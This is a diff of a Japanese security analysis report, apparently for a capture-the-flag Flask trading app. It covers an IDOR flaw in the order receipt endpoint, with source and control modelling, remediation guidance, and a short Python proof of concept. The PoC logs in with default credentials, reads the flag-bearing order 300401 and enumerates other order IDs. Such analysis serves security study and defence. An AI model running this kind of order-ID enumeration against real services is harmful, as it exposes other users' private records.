@@ -16,25 +16,25 @@
 ### Principals (データ源)
 
 - **order_id (URL parameter)**: Untrusted
-  - Context: URLパスパラメータとしてユーザーから提供されるorder_id
-  - Risk Factors: ユーザー制御可能, 直接オブジェクト参照に使用, 認可チェックなし
+  - Context: routes.py:94 - URLパスパラメータとしてユーザーから直接受け取るorder_id
+  - Risk Factors: ユーザー制御可能, 認可チェックなしで使用, 任意のIDを指定可能
 - **session['user_id']**: SemiTrusted
-  - Context: ログイン成功後にセッションに保存されるユーザーID
-  - Risk Factors: 認証済みだが認可には使用されていない
+  - Context: routes.py:97 - セッションに保存されたユーザーID（ログイン済みユーザー）
+  - Risk Factors: 認証のみ確認、認可は確認しない
 - **/flag file content**: Trusted
-  - Context: サーバーサイドのフラグファイル内容
-  - Risk Factors: 機密データがDBに保存されている, 不適切なアクセス制御
+  - Context: __init__.py:85-86 - サーバー上の機密ファイル
+  - Risk Factors: 機密データがDBに格納される, 不適切なアクセス制御
 
 ### Actions (セキュリティ制御)
 
 - **session.get('user_id') check**: Insufficient
   - Function: ユーザーがログインしているかを確認
-  - Weaknesses: 認証のみで認可を確認していない, ユーザーと注文の関連を検証していない
-  - Bypass Vectors: 任意のユーザーでログインすれば任意の注文にアクセス可能
-- **Order.query.get(order_id)**: Missing
-  - Function: 注文データの取得
-  - Weaknesses: ユーザーIDによるフィルタリングなし, 直接オブジェクト参照
-  - Bypass Vectors: 任意のorder_idを指定してデータ取得
+  - Weaknesses: 認証のみで認可チェックがない, order_idの所有権を検証しない
+  - Bypass Vectors: 正規ユーザーでログイン後、任意のorder_idを指定
+- **Order.query.get(order_id)**: Bypassed
+  - Function: 指定されたIDのオーダーを取得
+  - Weaknesses: ユーザーの所有権チェックなしで任意のオーダーを取得
+  - Bypass Vectors: order_idを推測またはブルートフォース
 
 ### Resources (操作対象)
 
@@ -42,20 +42,20 @@
   - Operation: データベース読み取り
   - Protection: 認証のみ（不十分）
 - **/flag file**: Critical
-  - Operation: ファイル読み取り→DB保存
-  - Protection: なし
+  - Operation: ファイル読み取り
+  - Protection: なし - 起動時にDBに格納される
 
 ### Policy Violations
 
-#### AUTHZ-001: リソースへのアクセスには適切な認可チェックが必要
+#### AUTHZ-001: リソースへのアクセスには認証と認可の両方が必要
 
-- **Path**: order_id (URL param) -> session check (認証のみ) -> Order.query.get() -> receipt表示
+- **Path**: order_id (untrusted URL param) -> session check (authentication only) -> Order.query.get() -> receipt display
 - **Severity**: critical
 - **Confidence**: 0.95
 
-#### DATA-001: 機密データは適切なアクセス制御で保護する必要がある
+#### DATA-001: 機密データは適切なアクセス制御で保護される必要がある
 
-- **Path**: /flag file -> open() -> Order.receipt -> IDOR経由で漏洩
+- **Path**: /flag file -> Order.receipt -> IDOR経由で漏洩
 - **Severity**: critical
 - **Confidence**: 0.90
 
@@ -67,103 +67,73 @@ open('/flag')
 
 ## 詳細解析
 
-このアプリケーションは**IDOR（Insecure Direct Object Reference）脆弱性**を持つトレーディングプラットフォームです。
+このFlaskトレーディングプラットフォームには**重大なIDOR脆弱性**が存在します。
 
-**主要な脆弱性の詳細**:
+**主要な脆弱性の流れ:**
+1. `__init__.py:85-96`で`/flag`ファイルの内容が`order_id=300401`のOrderレコードの`receipt`フィールドに格納される
+2. `routes.py:94-106`の`/order/<int:order_id>/receipt`エンドポイントでは、認証チェック（ログイン確認）のみが行われ、**認可チェック（そのオーダーがログインユーザーのものか）は行われていない**
+3. 攻撃者は正規ユーザー（test/test）でログイン後、`/order/300401/receipt`にアクセスするだけでフラグを取得可能
 
-1. `/order/<int:order_id>/receipt` エンドポイントでは、ユーザーがログインしているかどうかのみを確認し、**リクエストされた注文がそのユーザーのものかどうかを検証していません**。これにより、認証済みの攻撃者は任意のorder_idを指定して他のユーザーの注文レシートを閲覧できます。
-
-2. アプリケーション初期化時に `/flag` ファイルの内容がorder_id=300401のレシートとして保存されています。この注文はuser_idがNullで、どのユーザーにも紐付いていません。
-
-3. IDORを悪用して `/order/300401/receipt` にアクセスすることで、認証済みユーザーは機密データ（フラグ）を取得できます。
-
-**攻撃シナリオ**:
-1. デフォルト認証情報（test/test）でログイン
-2. /order/300401/receipt にアクセス
-3. フラグの内容がレシートとして表示される
+**追加の脆弱性:**
+- ハードコードされた弱いシークレットキー（`your_secret_key`）
+- データベース認証情報がソースコードに平文で記載
+- パスワードが平文で保存（ハッシュ化なし）
+- デフォルト認証情報（test/test）
 
 ## PoC（概念実証コード）
 
 ```text
-# IDOR脆弱性を利用したフラグ取得PoC
 import requests
 
-# ターゲットURL
-BASE_URL = "http://localhost:5000"  # 実際のホストに変更
+# PoC: IDOR vulnerability to access sensitive flag data
+# 1. Login with default credentials
+# 2. Access another user's order receipt containing the flag
 
-# セッションを開始
-session = requests.Session()
+BASE_URL = 'http://localhost:5000'
 
-# Step 1: デフォルト認証情報でログイン
-print("[*] ログイン中...")
-login_data = {"username": "test"}
-resp = session.post(f"{BASE_URL}/", data=login_data, allow_redirects=True)
-
-# Step 2: パスワードページでパスワードを送信
-print("[*] パスワード送信中...")
-password_data = {"password": "test"}
-resp = session.post(f"{BASE_URL}/password/test", data=password_data, allow_redirects=True)
-
-# Step 3: IDORを利用してフラグが含まれるレシートにアクセス
-# フラグはorder_id=300401に保存されている
-print("[*] IDOR脆弱性を利用してフラグを取得中...")
-resp = session.get(f"{BASE_URL}/order/300401/receipt")
-
-if resp.status_code == 200:
-    print("[+] レシートページにアクセス成功!")
-    # HTMLからフラグを抽出（receiptフィールドに含まれている）
-    if "FLAG" in resp.text or "flag" in resp.text.lower():
-        print("[+] フラグを含むレシートを発見!")
-        print(resp.text)
-else:
-    print(f"[-] アクセス失敗: {resp.status_code}")
-
-# 追加: 他の注文IDを列挙してレシートを取得
-print("\n[*] 他の注文IDを列挙中...")
-for order_id in [300123, 300214, 300327, 300481, 300401]:
-    resp = session.get(f"{BASE_URL}/order/{order_id}/receipt")
-    if resp.status_code == 200:
-        print(f"[+] Order ID {order_id}: アクセス成功")
+with requests.Session() as session:
+    # Step 1: Login with default credentials (test/test)
+    # First, submit username
+    login_resp = session.post(f'{BASE_URL}/', data={'username': 'test'})
+    
+    # Then, submit password
+    password_resp = session.post(f'{BASE_URL}/password/test', data={'password': 'test'})
+    
+    # Step 2: Exploit IDOR - Access order receipt that doesn't belong to current user
+    # Order ID 300401 contains the flag and has no user_id (orphan order)
+    idor_resp = session.get(f'{BASE_URL}/order/300401/receipt')
+    
+    # The response will contain the flag content in the receipt field
+    print('IDOR Exploitation Result:')
+    print(idor_resp.text)
+    
+    # Alternative: Enumerate other order IDs
+    for order_id in [300123, 300214, 300327, 300481, 300401]:
+        resp = session.get(f'{BASE_URL}/order/{order_id}/receipt')
+        print(f'Order {order_id}: {resp.status_code}')
 ```
 
 ## 修復ガイダンス
 
-### /order/<order_id>/receipt エンドポイント
+### /order/<int:order_id>/receipt エンドポイント
 
-- **Required**: 注文の所有者確認を追加
-- **Guidance**: Order.query.filter_by(id=order_id, user_id=user_id).first() を使用して、現在のユーザーの注文のみ取得するように変更
+- **Required**: 認可チェックの追加
+- **Guidance**: Order取得後、order.user_id == session['user_id']を検証し、一致しない場合は403を返す
 - **Priority**: critical
 
-### 機密データの保存方法
+### 機密データの格納方法
 
-- **Required**: フラグなどの機密データをDBに保存しない
-- **Guidance**: 機密データは専用のセキュアストレージに保存し、必要な認可を持つユーザーのみアクセス可能にする
-- **Priority**: critical
-
-### 認証情報管理
-
-- **Required**: デフォルト認証情報の削除とパスワードハッシュ化
-- **Guidance**: bcryptなどを使用してパスワードをハッシュ化し、デフォルトの認証情報を本番環境から削除する
+- **Required**: フラグなどの機密データをユーザーアクセス可能なDBに格納しない
+- **Guidance**: 機密データは別の保護されたストレージに格納し、必要な場合のみアクセス制御を通じて取得
 - **Priority**: high
 
-### secret_key
+### シークレットキーとDB認証情報
 
-- **Required**: ハードコードされた秘密鍵を環境変数から取得
-- **Guidance**: app.secret_key = os.environ.get('SECRET_KEY') とし、強力なランダムキーを使用
+- **Required**: ハードコードされた認証情報を環境変数に移行
+- **Guidance**: app.secret_keyとSQLALCHEMY_DATABASE_URIを環境変数から読み込む
 - **Priority**: high
 
 ## 解析ノート
 
-分析対象のコードを調査しました。以下の主要な脆弱性を発見しました：
-
-1. **IDOR (Insecure Direct Object Reference)**: routes.py の `/order/<int:order_id>/receipt` エンドポイントで、ユーザーが自分の注文かどうかを確認せずに任意のorder_idでレシートを取得できます。コメントで明示的に脆弱性が記載されています。
-
-2. **機密データ漏洩**: __init__.py でフラグファイル(/flag)の内容がOrderのreceiptフィールドに保存されています。このOrderはuser_id=Noneで、特定ユーザーに紐付いていません。
-
-3. **IDORとデータ漏洩の組み合わせ**: IDORを利用してorder_id=300401のレシートにアクセスすることで、フラグの内容を取得できます。
-
-4. **その他のセキュリティ問題**:
-   - ハードコードされた秘密鍵（app.secret_key）
-   - パスワードが平文で保存
-   - デフォルトの認証情報（test/test）
+このFlaskアプリケーションを分析しました。主な脆弱性として、routes.py:94-104にIDOR（Insecure Direct Object Reference）脆弱性が存在します。/order/<int:order_id>/receiptエンドポイントでは、ユーザーがログインしているかどうかのみを確認し、そのorder_idがログインしているユーザーに属しているかを検証していません。これにより、認証済みの任意のユーザーが他のユーザーの注文レシートを閲覧できます。さらに、__init__.pyでは/flagファイルの内容がorder_id=300401のレシートに格納されており、IDOR脆弱性を悪用することでフラグを取得できます。また、ハードコードされた弱いシークレットキーやデータベース認証情報も問題です。
 
